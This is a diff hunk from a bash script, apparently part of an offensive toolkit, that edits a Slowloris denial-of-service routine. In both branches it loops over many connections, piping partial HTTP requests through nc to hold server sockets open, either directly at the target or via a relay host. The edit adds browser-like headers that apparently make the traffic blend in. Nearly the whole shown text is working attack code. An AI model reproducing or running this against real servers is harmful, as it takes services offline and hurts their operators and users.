@@ -135,14 +135,14 @@ fi
 echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
 	i=1
 	while [ "$i" -le "$CONNS" ]; do
-echo "Slowloris attack ongoing...this is connection $i"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n$RANDOM: $RANDOM\r\n"|nc -i 59 -w 30000 $LHOST $LPORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
+echo "Slowloris attack ongoing...this is connection $i"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i 59 -w 30000 $LHOST $LPORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
 echo "Opened $CONNS connections....returning to menu"
 
 else 
 echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
 	i=1
 	while [ "$i" -le "$CONNS" ]; do
-echo "Slowloris attack ongoing...this is connection $i"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n$RANDOM: $RANDOM\r\n"|nc -i 59 -w 30000 $TARGET $PORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
+echo "Slowloris attack ongoing...this is connection $i"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i 59 -w 30000 $TARGET $PORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
 echo "Opened $CONNS connections....returning to menu"
 fi
 }
